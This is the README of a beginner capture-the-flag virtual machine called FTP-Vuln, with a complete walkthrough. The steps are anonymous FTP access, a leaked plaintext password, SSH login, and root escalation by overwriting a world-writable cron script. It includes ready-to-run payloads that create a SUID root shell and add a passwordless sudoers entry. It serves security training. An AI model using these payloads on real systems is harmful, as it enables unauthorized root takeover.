# FTP-Vuln - Boot to Root Challenge

## Description

Vulnerable virtual machine of **easy** level (beginner) designed to practice offensive cybersecurity. The objective is to fully compromise the system (boot-to-root) by exploiting misconfigurations in network services.

- **Base system**: Ubuntu Server 20.04 / 22.04 / 24.04
- **Difficulty**: Easy
- **Flags**: user.txt, root.txt
- **Vulnerable user**: orami
- **Author**: orami

## Learning objectives

- Service enumeration with nmap
- Exploitation of anonymous FTP access
- Obtaining credentials from files
- SSH access with leaked credentials
- Privilege escalation via a misconfigured cronjob

## Requirements

### For VM (OVA)
- VirtualBox, VMware, or QEMU/KVM
- 1 GB RAM and 1 CPU allocated to the VM
- NAT or Host-Only network mode

### For Docker
- Docker Engine 20+ installed
- ftp and ssh client on the attacking machine

### Attacker tools
- nmap, ftp, ssh (alternatively: curl, netcat)

## Exploitation path

### Step 1: Service enumeration

```
nmap -sC -sV -Pn <VM_IP>
```

Expected result:
- Port 21: vsftpd (FTP)
- Port 22: OpenSSH (SSH)

### Step 2: Anonymous FTP access

```
ftp -p <VM_IP>
Name: anonymous
Password: [ENTER]
```

Note: the `-p` flag forces passive mode, required when FTP runs behind NAT, Docker, or port forwarding. Without `-p` you may see errors like `500 Bad EPRT protocol` or `bind: Address already in use`.

Navigate to the `files` directory and download `leeme.txt`:

```
cd files
get leeme.txt
```

File content: `credentials: oramiuser:123456`

### Step 3: SSH access

```
ssh orami@<VM_IP>
Password: 123456
```

Get the first flag:

```
cat /home/orami/user.txt
```

### Step 4: Why look for cronjobs after initial access?

Once you have a shell as a low-privilege user, the next goal is to find a way to escalate to root. There are several common vectors: SUID binaries, kernel exploits, misconfigurations, and scheduled tasks. Cronjobs are one of the most reliable and beginner-friendly escalation paths because:

- **They run automatically** without user intervention, so the attacker only needs to wait.
- **They often run as root**, since they are system maintenance tasks (backups, cleanup, reports).
- **If the script they execute is writable by any user**, an attacker can replace it with a malicious payload. The next time the cronjob fires, the payload runs with root privileges.

In real systems, a cronjob running a world-writable script as root is a critical misconfiguration. This is exactly what this challenge simulates.

### Step 5: Enumerating cronjobs

After getting SSH access and reading the user flag, look for scheduled tasks that could be exploited:

```
# Check if the current user has any crontab entries
crontab -l

# List all system-wide cronjobs
ls -la /etc/cron.d/
cat /etc/cron.d/*

# Check the main crontab file
cat /etc/crontab

# Search for cron scripts owned by or writable by the current user
find /etc/cron* -type f -writable 2>/dev/null
find /usr/local/bin -type f -writable 2>/dev/null
```

In this challenge, you will find:

```
cat /etc/cron.d/rootjob
```

Expected output:

```
* * * * * root /usr/local/bin/backup.sh
```

Check script permissions:

```
ls -l /usr/local/bin/backup.sh
# -rwxrwxrwx (777) - any user can modify it
```

This reveals 3 conditions that create the vulnerability:

1. A cronjob runs `backup.sh` as **root** every minute
2. The script has **777** permissions (any user can modify it)
3. As orami you can overwrite the script and cron will execute it with root privileges

### Step 6: Cronjob exploitation

Any of the following options works. Choose the one you prefer.

**Option A (SUID - used in this challenge)**

Creates a copy of bash with the SUID bit set. When executed with `-p`, bash inherits the UID of the file owner (root).

```
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Wait 1 minute, then:

```
/tmp/rootbash -p
whoami
# root
```

**Option B (sudoers - more direct)**

Adds orami to the sudoers file to run any command without a password.

```
echo -e '#!/bin/bash\nchmod 777 /etc/sudoers\necho "orami ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\nchmod 440 /etc/sudoers' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Wait 1 minute, then:

```
sudo su
whoami
# root
```

**Option C (change root.txt permissions - simplest)**

Directly changes root flag permissions so any user can read it.

```
echo -e '#!/bin/bash\nchmod 777 /root/root.txt' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Wait 1 minute, then:

```
cat /root/root.txt
```

### Step 7: Capture the final flag

With any of the 3 options above, once you are root:

```
cat /root/root.txt
```

## Flags

| Flag     | Location                  |
|----------|---------------------------|
| user.txt | /home/orami/user.txt    |
| root.txt | /root/root.txt            |

## Privilege escalation explained

The cronjob runs every minute as root thanks to this line in `/etc/cron.d/rootjob`:

```
* * * * * root /usr/local/bin/backup.sh
```

The `backup.sh` script has 777 permissions, meaning **any user on the system** can read, write, and execute it. This is a bad security practice: the script should be owned by root with 700 permissions (only root can modify it).

The exploitation follows this logic:

1. orami overwrites `backup.sh` with a malicious payload
2. The cronjob detects 1 minute has passed and executes the script as root
3. The payload runs with root privileges
4. The attacker gains root access or the flag directly

All 3 options presented (SUID, sudoers, direct chmod) achieve the same goal: executing code as root. The difference is in the payload and how you access root afterward.

## Technical notes

- FTP allows anonymous access (vsftpd)
- SSH allows password authentication
- Cronjob runs every minute as root with a 777 script
- No external exploits or Metasploit required

## How to deploy the machine

### Option 1: Docker (recommended)

Clone the repository and build the image:

```
git clone https://github.com/oramirez13/FTP-Vuln.git
cd FTP-Vuln
docker build -t ftp-vuln .
docker run -d --name ftp-vuln -p 2121:21 -p 2222:22 -p 30000-30010:30000-30010 ftp-vuln
```

The container exposes:
- Port 2121 -> FTP (mapped to container port 21)
- Port 2222 -> SSH (mapped to container port 22)
- Ports 30000-30010 -> FTP passive mode range

To connect:
```
ftp -p localhost 2121
ssh orami@localhost -p 2222
```

Stop and remove:
```
docker stop ftp-vuln && docker rm ftp-vuln
```

### Option 2: Manual VM with setup.sh

On any Debian/Ubuntu distro:
```
sudo ./setup.sh
```

### Option 2: Docker

```
docker build -t ftp-vuln .
```

## setup.sh requirements

Works on any Debian/Ubuntu-based distro with apt:
- Ubuntu Server 20.04, 22.04, 24.04
- Debian 11/12
- Kali Linux

## Author

orami
Original project: FTP-Vuln
